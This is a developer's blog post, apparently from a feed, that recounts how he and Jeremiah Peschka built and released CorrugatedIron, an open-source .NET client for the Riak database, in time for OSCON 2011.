<p>I would love to cover off all of the features here, but we&rsquo;ve already done it on the <a href="http://corrugatediron.org/" title="CorrugatedIron">official site</a>, so head over there to take a look at the feature list, documentation and sample projects.</p>

<h2>The What, Where, Why and How</h2>

<h3>How it all began</h3>

<p>I don&rsquo;t remember the exact date that I was first exposed to <a href="http://riak.basho.com/" title="Riak">Riak</a>, <a href="http://basho.com/" title="Basho">Basho</a>&rsquo;s bomb-proof database, but I do remember being very impressed. It was around the time I really started to get an interest in <a href="http://www.erlang.org/" title="Erlang">Erlang</a> programming, so it probably isn&rsquo;t a surprise, given that Riak is written in Erlang, that it piqued my interest. I have a bit of a fascination with systems that don&rsquo;t stop, and Riak fits firmly in that category.</p>

<p>So after playing with it for a while and marvelling at the sturdiness, the ease of set-up (even with clustering), the clever architecture and the make-up of the system, I realised that Riak was actually pretty special. Almost in a class of it&rsquo;s own. Its properties really appealed to me, and I felt the need to do something with.</p>

<p>Back then, I wasn&rsquo;t even working with Erlang professionally. The clients that I had at the time were pure .NET shops and didn&rsquo;t feel the need to consider anything other than the &ldquo;tried and true&rdquo; <a href="http://en.wikipedia.org/wiki/Relational_database_management_system" title="Relational Databases">RDBMS</a> (which in Brisbane seems to be mainly MS SQL, particularly in the .NET circles). Given that the likelihood of my working with Riak in a professional sense in the short term was fairly slim, I wanted to look to other areas where I could work with it and contribute to it at the same time. Needless to say, my Erlang-fu wasn&rsquo;t (and still isn&rsquo;t) up to scratch, so contributing to Riak itself wasn&rsquo;t yet something I thought I could take on. I needed something else.</p>

<p>Late last year, I was starting to look for projects that I could build and release as <a href="http://www.opensource.org/" title="Open Source">Open Source</a>. I have, on my occasions, contributed to other Open Source projects but I hadn&rsquo;t worked on one of my own and released it into the wild. This is something that I really wanted to do and so was looking for something to build.</p>

<p>During my travels in the Riak circles I had noticed that there were quite a few clients available which allowed people to talk to Riak from various languages. Basho themselves <a href="http://wiki.basho.com/Client-Libraries.html" title="Client libraries">support</a> ones for Erlang, Java, PHP, Python and Ruby, and there are many more listed on the <a href="http://wiki.basho.com/Community-Developed-Libraries-and-Projects.html#Client-Libraries-and-Frameworks" title="Client libraries">Riak community clients page</a> which cover languages like C, Clojure, Go, Node.js, Perl, Scala and more.</p>

<p>Amongst this libraries there were two listed for .NET. Both of them seemed to have a small set of functionality, they both weren&rsquo;t finished and at the time they both had not been touched for quite a while. In short, for .NET people, there really wasn&rsquo;t a viable option for Riak connectivity. What a travesty!</p>

<p>I remember sending an email to <a href="http://twitter.com/pharkmillups" title="Mark Phillips">Mark</a> telling him that I was pondering the thought of building this library to make sure that there wasn&rsquo;t already someone else out there making a go of it. He was aware of the two existing solutions but didn&rsquo;t know what the plans were with them, and he wasn&rsquo;t aware of any others at the time. This was all the validation that I needed.</p>

<p>So, in late 2010, I decided that the first project I wanted to build and release to the world as an Open Source application was a .NET client for Riak, one that worked on both the <a href="http://en.wikipedia.org/wiki/Common_Language_Runtime" title="Microsoft CLR">CLR</a> and on <a href="http://www.mono-project.com/" title="Mono">Mono</a>. This is where CorrugatedIron was conceived.</p>

<h3>So why the long wait?</h3>

<p>If you look at the <a href="https://github.com/DistributedNonsense/CorrugatedIron/graph">history</a> of the code-base you&rsquo;ll see that I had an initial flurry of activity in early 2011, but didn&rsquo;t really do anything else for quite some time. There&rsquo;s a reason for that!</p>

<p>When I first decided on the project, I spent a bit of time thinking about the design. I wanted the interface to be more &ldquo;functional&rdquo; in many ways. I wanted to remove the idea of resource management away from the caller. I didn&rsquo;t want to give them rope (such as <code>IDisposable</code> instances) with which to hang themselves (such as forgetting to <code>Dispose()</code>). I wanted the interface to be clean, simple, intuitive and safe.</p>

<p>This little in-memory design session went on for quite some time, but I didn&rsquo;t really put anything down on paper. Nor did I write any code. Instead, I though that I would put something together which wasn&rsquo;t really related or as important as the API. Something that was lower level which the user of the library would not (and should not) see.</p>

<p>A Riak node has two interfaces which clients can connect to. One of them is a <a href="http://en.wikipedia.org/wiki/Representational_State_Transfer" title="REST">REST</a> API, and the other is a binary API which utilises <a href="http://code.google.com/p/protobuf/" title="Protocol Buffers">Protocol Buffers</a>. I thought that it would be fun to start working on the Protocol Buffer handling while the idea of the API formed slowly in the back of my mind.</p>

<h3>Then along came JP</h3>

<p>Then, just before Christmas (23rd December to be exact) I received an email out of the blue from a chap in America. Here&rsquo;s how it started:</p>

<blockquote><p>Greetings from America!</p>

<p>Hope your summer is going well. Mark Phillips told me that you were interested in working on a good .net driver for Riak. Have you made any progress or is it still a general idea in your head?</p></blockquote>

<p>There was much more to the email than that, but it certainly started off well! The email was from <a href="http://facility9.com/" title="Jeremiah Peschka">Jeremiah Peschka</a>, a chap who&rsquo;s name I had seen floating around the Riak <a href="http://lists.basho.com/mailman/listinfo/riak-users_lists.basho.com" title="Riak mailing list">mailing list</a>. In fact, I remember his name catching my eye on more than one occasion because his email signature contained the following:</p>

<blockquote><p>Microsoft SQL Server MVP<br/>
MCITP: Database Developer, DBA</p></blockquote>

<p>This resonated with me because he was obviously into RDBMSs, but hadn&rsquo;t been a complete asshat on a list full of people working with <a href="http://en.wikipedia.org/wiki/NoSQL" title="NoSQL">NoSQL</a>. This was a rare and surprising thing.</p>

<p>Moving on. After a few email exchanges, Jeremiah indicated that he was interested in helping to build CorrugatedIron (despite the whacky name) and we decided to team up. I knew that he&rsquo;d definitely add value to the whole process and would also keep me motivated. Plus, his obvious skills in the SQL realm would no doubt be useful too!</p>

<p>We continued to talk into January and I thought that it was past time that I shared the code that I had hacked together so that we had a starting/talking point. On the 7th January, I committed my first <a href="https://github.com/DistributedNonsense/CorrugatedIron/--SOMETHING-GOES-HERE--">batch of code</a> to the repository which contained a stack of very untested code. I don&rsquo;t even know if it worked! The result: we had a lot to talk about.</p>

<h3>Another intermission</h3>

<p>Though JP and I continued to talk a great deal via email, we were both quite under the pump with our respective places of employment. We shared ideas along the way, but neither of us were really into the project as a result of the intense work we had on elsewhere. Though I&rsquo;m fairly certain that the thought of the project wasn&rsquo;t far from our minds the whole time.</p>

<p>Then on the 12th April, out of the blue again, another email came. I&rsquo;m not going to divulge all the detail, but the crux of it indicated that there was a growing interest in seeing a .NET client for Riak from people in other areas of the world. It also asked what the story was with the client that we were building, and wondered if we had a timeline down with a potential release date.</p>

<p>This was scary, exciting and a slap in the face at the same time. Scary and exciting because there was a possibility that someone out there might want to use what we were building. A slap in the face because we hadn&rsquo;t really done much at all other than the initial commit and a great deal of talking. It was just the wake up call that we needed.</p>

<p>I spoke to JP about the email and we both decided that it was well past time to get our heads down and start working on this thing for real. We needed to lock in a set of features, a time-frame for development and, most importantly, a release date.</p>

<p>So, we did!</p>

<h3>All ahead flank</h3>

<p>In early May, JP and I managed to start freeing up time that we could then contribute to our project. Development ramped up and kicked off in mid-May, and on the 18th, we committed our first changeset to the repository since the very first commit in January. From there, we went nuts!</p>

<p>We consistently worked on things and pushed our code back and forth for the latter half of May and well in to June. At this point, things really started to get exciting.</p>

<p>We had managed to get quite a few features out in a small period of time, and were generally very happy with our progress. JP was making the most of his superior Riak knowledge and was banging out API features like there was no tomorrow. Meanwhile, I had my head down in the guts of the underlying bits, trying to keep things sane.</p>

<p>It was at this point we were told of <em>more</em> people who were keen to get their hands on a quality .NET client, and that if we could get the client ready in time, various individuals would be happy to talk about it during <a href="http://oscon.com/" title="OSCON">OSCON</a>, the biggest Open Source convention I know of. Awesome! This was an opportunity too good to miss.</p>

<p>We finalised our feature-set for v0.1.0, wrote down our final time-line and informed various parties of what we were planning to do. It was locked in. We were heads down, bums-up trying to get things into shape. It was all very exciting.</p>

<h3>Even more interest</h3>

<p>By early July, we had somehow managed to attract the attention of two more individuals who were looking for this functionality. Both of which put their hands up to the opportunity to look at our Alpha software, take it for a spin and give us some feedback. This was awesome. Having other people look over the code and critique it while, in some ways, evaluating it for their own needs is a great thing.</p>

<p>After a short period of time, we received very constructive (and, just quietly, rather gratifying) comments from both guys. It made us feel like we couldn&rsquo;t be doing too badly!</p>

<p>We opened up the repository to them so that they could get the latest code whenever they wanted, and also opened it up to some of the Basho guys so that they could also cast their eyes over it. The cat was slowly coming out of the bad.</p>

<p>On the 20th July, we locked in the feature-set for v0.1.0 and froze the codebase for all but minor changes, bug fixes and tweaks. It was time to do what everyone <em>loves</em> to do: <strong>documentation</strong>.</p>

<p>Given that I tend to hate documentation, straight away I was looking for something else to fill the time with. Thankfully, alongside documentation, we also needed a few sample applications (let&rsquo;s face it, as devs we learn much faster from working code compared to reams of documentation). So I leapt on the opportunity to crank out <a href="https://github.com/DistributedNonsense/CorrugatedIron.Samples/tree/master/VisualStudio2010/Sample.YakRiak" title="YakRiak.NET">YakRiak.NET</a>, a .NET client for <a href="https://github.com/seancribbs" title="Sean Cribbs">Sean Cribbs</a>&lsquo; <a href="https://github.com/seancribbs/yakriak" title="The original YakRiak">YakRiak</a> chat application. It was incredibly simple to do and didn&rsquo;t take very long at all. When building the app, and finally <em>using</em> my own software, I have to admit I felt pretty good. It was nice to use my own software for something fun!</p>

<p>After that, JP put together a new <a href="https://github.com/peschkaj/CorrugatedIron.Samples/tree/master/VisualStudio2010/Sample.SessionStateProvider">Session State Provider</a> which used Riak as the back-end store. How good is that! Riak-backed session state in .NET. Awesome sauce.</p>

<p>I also finalised a small sample application which utilised some of the most common IoC frameworks to wire in the configuration, and began working on the &lsquo;real&rsquo; documentation again.</p>

<h3>&ldquo;Going live&rdquo;</h3>

<p>Finally, on the 25th July, after a couple of months of intense development, sample app creation, documentation and blog posts, CorrugatedIron was released to the world &mdash; just in time for OSCON (phew!).</p>

<p>While the documentation isn&rsquo;t as thorough as we would like, and our unit test coverage isn&rsquo;t as high as we&rsquo;d like, we&rsquo;re very happy with what we&rsquo;ve managed to achieve. This first release is by no means the last, and JP and I are both excited about what we&rsquo;re going to add to it in the future.</p>

<h3>A small side note</h3>

<p>When people first start working on projects like this there is always a risk that personalities will clash and the software will suffer. JP and I knew nothing of each other when we started this thing, yet over time have got to know each other and had a great deal of fun learning from each other. I think I&rsquo;ve been really fortunate in having JP involve himself in this project. He has been open to different ideas and opinions, has never come across as an ass and has been a real pleasure to work with the whole time.</p>

<p>So, JP, thanks mate! I&rsquo;m really glad you got involved. CorrugatedIron wouldn&rsquo;t be what it is now if you hadn&rsquo;t.</p>

<h3>The End</h3>

<p>Thanks for reading this far! If you&rsquo;re a .NET mofo and you&rsquo;re keen to get your Riak on, <a href="https://github.com/DistributedNonsense/CorrugatedIron" title="Source code">grab the source</a>, <a href="https://github.com/DistributedNonsense/CorrugatedIron/downloads" title="Binary downloads">download the binaries</a> or <a href="http://www.nuget.org/List/Packages/CorrugatedIron" title="Nuget package">install the Nuget package</a> and get cracking! Feedback is always welcome, as are patches. So if you&rsquo;ve got something to add, take away or refine, fork our <a href="https://github.com/DistributedNonsense/CorrugatedIron" title="Source code">repository</a> and get those pulls requests happening!</p>
]]></content>
  </entry>
  
</feed>
